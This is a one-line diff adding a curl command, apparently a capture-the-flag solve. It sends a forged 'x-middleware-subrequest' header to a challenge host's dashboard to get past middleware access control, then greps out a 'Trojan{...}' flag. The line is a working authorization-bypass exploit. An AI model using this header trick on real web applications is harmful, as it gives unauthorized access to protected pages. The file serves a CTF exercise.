@@ -1,0 +1,1 @@
+curl -s --header "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://phantom.chall.trojanc.tf/dashboard | grep -o -P "Trojan{(.*?)}"
